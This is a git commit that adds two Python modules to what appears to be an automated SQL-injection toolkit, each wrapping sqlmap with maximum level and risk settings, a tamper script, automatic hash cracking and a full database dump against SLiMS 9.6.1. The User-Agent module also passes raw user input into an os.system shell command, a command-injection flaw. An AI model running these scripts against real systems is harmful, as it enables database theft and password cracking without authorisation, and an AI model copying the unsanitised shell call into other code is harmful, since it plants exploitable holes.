1462027ef2baa93dc0f1feb843aedf76b2d99774
nu11secur1ty <venvaropt@gmail.com>
2025-07-21 14:11:36 +0300

    Add files via upload

---
+++ program/Full_Python_Automated/modules/URLi.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python
+# nu11secur1ty 2023-2025
+import time
+import os
+from colorama import init, Fore, Back, Style
+init(convert=True)
+import requests
+
+print("The PoC process will be continue...\n")
+time.sleep(3)
+
+# Parameter
+print(Fore.GREEN +"Press Enter to continue...\n")
+print(Style.RESET_ALL)
+
+# Here you can modify your OWN injection construction!
+# Your EXPLOIT ENVIRONMENT 
+env = 'C:\\Users\\nu11secur1ty\\Desktop\\slims9_bulian-9.6.1\\SQLi\\G0BurpSQLmaPI\\'
+os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
+
+print(Fore.RED +"Happy hunting with nu11secur1ty =)")
+print(Style.RESET_ALL)
---
+++ program/Full_Python_Automated/modules/User-Agent.py
@@ -0,0 +1,26 @@
+#!/usr/bin/python
+# nu11secur1ty 2023-2024
+import time
+import os
+from colorama import init, Fore, Back, Style
+init(convert=True)
+import requests
+
+print("The PoC process will be continue...\n")
+time.sleep(3)
+
+# Parameter
+print(Fore.GREEN +"Put your special parameter for User-Agent, or press Enter to return to the menu...\n")
+print(Style.RESET_ALL)
+
+print(Fore.RED)
+User_Agent = input()
+print(Style.RESET_ALL)
+
+# Here you can modify your OWN injection construction!
+# Your EXPLOIT ENVIRONMENT 
+env = 'C:\\Users\\nu11secur1ty\\Desktop\\slims9_bulian-9.6.1\\SQLi\\G0BurpSQLmaPI\\'
+os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --tamper=space2comment --user-agent='+User_Agent+' --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
+
+print(Fore.RED +"Happy hunting with nu11secur1ty =)")
+print(Style.RESET_ALL)
